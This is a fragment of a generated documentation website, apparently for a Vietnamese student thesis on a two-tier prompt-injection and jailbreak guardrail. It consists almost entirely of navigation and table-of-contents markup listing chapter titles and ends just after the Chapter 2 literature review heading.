+  <span class="md-ellipsis">
+    
+  
+    Tổng Quan Kiến Trúc 2 Tầng
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tier 1: Syntactic Baseline (TF-IDF)
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Tier 1: Syntactic Baseline (TF-IDF)
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../models/tfidf_theory_and_math/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lý Thuyết & Toán Học
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../models/tfidf_usage/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hướng Dẫn & Sử Dụng
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../models/tfidf_resources/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tài Liệu & Video Tham Khảo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_3" id="__nav_7_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tier 2: Deep Transformer (DeBERTa-v3)
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Tier 2: Deep Transformer (DeBERTa-v3)
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../models/deberta_theory_and_math/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lý Thuyết & Disentangled Attention
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../models/deberta_usage/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hướng Dẫn Fine-Tuning & ONNX
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../models/deberta_resources/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tài Liệu & Video Tham Khảo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../models/two_tier_tradeoffs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Phối Hợp 2 Tầng & Latency Tradeoffs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../research/sota_guardrail_benchmarks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Khảo Sát Các Guardrail SOTA
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../research/target_llm_vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Khảo Sát 5 Target LLM APIs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../research/tencent2026_paper_analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Phân Tích Bài Báo Tencent 2026
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../research/why_dual_model_architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Luận Giải Kiến Trúc Kết Hợp
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6. Robustness & Evasion Study
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    6. Robustness & Evasion Study
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../robustness/theory_and_evasion_mechanisms/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cơ Sở Lý Thuyết & Phân Mảnh Token
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../robustness/defense_architecture_and_mitigation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kiến Trúc Phòng Thủ Đa Tầng
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../robustness/benchmarks_metrics_and_tradeoffs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chỉ Số Đánh Giá & Đối Sánh Thực Nghiệm
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../robustness/resources_and_papers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tài Liệu, Bài Báo & Video Tham Khảo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7. Optimization & Quantization Study
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    7. Optimization & Quantization Study
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../optimization/quantization_math/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Toán Học Lượng Tử Hóa INT8 PTQ
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../optimization/onnx_runtime/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ONNX Runtime & Graph Optimizations
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../optimization/inference_acceleration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tăng Tốc Suy Luận & Thiết Kế Hệ Thống
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../optimization/benchmarks_tradeoffs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chỉ Số Đo Lường & Đánh Đổi Độ Trễ
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../optimization/resources_and_papers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tài Liệu, Bài Báo & Video Tham Khảo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8. Evaluation & FPR Economics Study
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_10">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    8. Evaluation & FPR Economics Study
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../evaluation_study/false_positive_economics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kinh Tế Học FPR & Trải Nghiệm Người Dùng
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../evaluation_study/pareto_frontier/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Đường Cong Biên Pareto & Đánh Đổi Hệ Thống
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../evaluation_study/resources_and_papers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tài Liệu, Benchmark & Bài Báo Đánh Đổi
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Luận Văn & Báo Cáo Milestone
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_11">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Luận Văn & Báo Cáo Milestone
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../capstone_register/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Đăng Ký Đề Tài (Register)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../review1_threat_model/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Review 1: Threat Model & Defense
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../chapter_01_introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chương 1: Giới Thiệu (Introduction)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chương 2: Tổng Quan Tài Liệu (Literature Review)
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chương 2: Tổng Quan Tài Liệu (Literature Review)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#21-review-of-previous-studies-khao-sat-cac-nghien-cuu-truoc-ay" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1. Review of Previous Studies (Khảo Sát Các Nghiên Cứu Trước Đây)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.1. Review of Previous Studies (Khảo Sát Các Nghiên Cứu Trước Đây)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#211-lich-su-phat-trien-ban-chat-ky-thuat-cac-vector-tan-cong-llm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1.1. Lịch Sử Phát Triển &amp; Bản Chất Kỹ Thuật Các Vector Tấn Công LLM
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.1.1. Lịch Sử Phát Triển &amp; Bản Chất Kỹ Thuật Các Vector Tấn Công LLM">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#a-tan-cong-prompt-injection-truc-tiep-lo-hong-ranh-gioi-lenhdu-lieu" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A. Tấn công Prompt Injection Trực tiếp &amp; Lỗ hổng Ranh giới Lệnh/Dữ liệu
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#b-tan-cong-prompt-injection-gian-tiep-chuan-anh-gia-bipia" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        B. Tấn công Prompt Injection Gián tiếp &amp; Chuẩn Đánh Giá BIPIA
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#c-tan-cong-be-khoa-an-toan-jailbreak-attacks-phan-loai-chien-thuat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        C. Tấn công Bẻ Khóa An Toàn (Jailbreak Attacks) &amp; Phân Loại Chiến Thuật
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#212-khao-sat-anh-gia-cac-giai-phap-guardrail-hien-nay-sota-baselines" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1.2. Khảo Sát &amp; Đánh Giá Các Giải Pháp Guardrail Hiện Nay (SOTA Baselines)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#213-khao-sat-cac-ky-thuat-phong-thu-o-ben-toi-uu-luong-hoa" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1.3. Khảo Sát Các Kỹ Thuật Phòng Thủ Độ Bền &amp; Tối Ưu Lượng Hóa
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#22-summary-of-the-literature-review-tong-hop-khao-sat-khoang-trong-nghien-cuu" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2. Summary of the Literature Review (Tổng Hợp Khảo Sát &amp; Khoảng Trống Nghiên Cứu)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.2. Summary of the Literature Review (Tổng Hợp Khảo Sát &amp; Khoảng Trống Nghiên Cứu)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#221-bang-so-sanh-toan-dien-cac-giai-phap-guardrail-hien-tai" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2.1. Bảng So Sánh Toàn Diện Các Giải Pháp Guardrail Hiện Tại:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#222-ba-khoang-trong-nghien-cuu-research-gaps-cot-loi-cua-chuyen-nganh-attt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2.2. Ba Khoảng Trống Nghiên Cứu (Research Gaps) Cốt Lõi Của Chuyên Ngành ATTT
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#23-contribution-of-research-ong-gop-khoa-hoc-thuc-tien-cua-o-an" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.3. Contribution of Research (Đóng Góp Khoa Học &amp; Thực Tiễn Của Đồ Án)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#24-mapping-trich-dan-hoc-thuat-chuan-ieee-100-2022" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.4. Mapping Trích Dẫn Học Thuật Chuẩn IEEE (100% &gt;= 2022)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references-tai-lieu-tham-khao-hoc-thuat-chuan-ieee" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References (Tài Liệu Tham Khảo Học Thuật Chuẩn IEEE)
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../final_thesis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Luận Văn Tổng Hợp Đầy Đủ
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
+        
+          
+          <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Thư Viện Bài Báo Khoa Học
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_12">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Thư Viện Bài Báo Khoa Học
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../references/references_overview/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tổng Quan 8 Bài Báo Slide & 18 Papers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../references/references_log/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Nhật Ký 18 Bài Báo Học Thuật
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
+        
+          
+          <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Đội Ngũ & Hướng Dẫn
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_13">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Đội Ngũ & Hướng Dẫn
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dev/team_governance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Phân Quyền Git & Workspace Rules
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dev/contributing_guide/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Quy Chuẩn Đóng Góp (Contributing)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dev/workspaces_overview/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tổng Quan Không Gian Thành Viên
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dev/src_architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kiến Trúc Source Code
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#21-review-of-previous-studies-khao-sat-cac-nghien-cuu-truoc-ay" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1. Review of Previous Studies (Khảo Sát Các Nghiên Cứu Trước Đây)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.1. Review of Previous Studies (Khảo Sát Các Nghiên Cứu Trước Đây)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#211-lich-su-phat-trien-ban-chat-ky-thuat-cac-vector-tan-cong-llm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1.1. Lịch Sử Phát Triển &amp; Bản Chất Kỹ Thuật Các Vector Tấn Công LLM
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.1.1. Lịch Sử Phát Triển &amp; Bản Chất Kỹ Thuật Các Vector Tấn Công LLM">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#a-tan-cong-prompt-injection-truc-tiep-lo-hong-ranh-gioi-lenhdu-lieu" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A. Tấn công Prompt Injection Trực tiếp &amp; Lỗ hổng Ranh giới Lệnh/Dữ liệu
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#b-tan-cong-prompt-injection-gian-tiep-chuan-anh-gia-bipia" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        B. Tấn công Prompt Injection Gián tiếp &amp; Chuẩn Đánh Giá BIPIA
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#c-tan-cong-be-khoa-an-toan-jailbreak-attacks-phan-loai-chien-thuat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        C. Tấn công Bẻ Khóa An Toàn (Jailbreak Attacks) &amp; Phân Loại Chiến Thuật
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#212-khao-sat-anh-gia-cac-giai-phap-guardrail-hien-nay-sota-baselines" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1.2. Khảo Sát &amp; Đánh Giá Các Giải Pháp Guardrail Hiện Nay (SOTA Baselines)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#213-khao-sat-cac-ky-thuat-phong-thu-o-ben-toi-uu-luong-hoa" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1.3. Khảo Sát Các Kỹ Thuật Phòng Thủ Độ Bền &amp; Tối Ưu Lượng Hóa
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#22-summary-of-the-literature-review-tong-hop-khao-sat-khoang-trong-nghien-cuu" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2. Summary of the Literature Review (Tổng Hợp Khảo Sát &amp; Khoảng Trống Nghiên Cứu)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.2. Summary of the Literature Review (Tổng Hợp Khảo Sát &amp; Khoảng Trống Nghiên Cứu)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#221-bang-so-sanh-toan-dien-cac-giai-phap-guardrail-hien-tai" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2.1. Bảng So Sánh Toàn Diện Các Giải Pháp Guardrail Hiện Tại:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#222-ba-khoang-trong-nghien-cuu-research-gaps-cot-loi-cua-chuyen-nganh-attt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2.2. Ba Khoảng Trống Nghiên Cứu (Research Gaps) Cốt Lõi Của Chuyên Ngành ATTT
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#23-contribution-of-research-ong-gop-khoa-hoc-thuc-tien-cua-o-an" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.3. Contribution of Research (Đóng Góp Khoa Học &amp; Thực Tiễn Của Đồ Án)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#24-mapping-trich-dan-hoc-thuat-chuan-ieee-100-2022" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.4. Mapping Trích Dẫn Học Thuật Chuẩn IEEE (100% &gt;= 2022)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references-tai-lieu-tham-khao-hoc-thuat-chuan-ieee" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References (Tài Liệu Tham Khảo Học Thuật Chuẩn IEEE)
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="chapter-2-literature-review">CHAPTER 2: LITERATURE REVIEW</h1>
+<blockquote>
+<p>👥 <strong>Thành viên phụ trách chính</strong>: Nguyễn Văn Trường (Leader) &amp; Đỗ Đoàn Duy Phương<br />
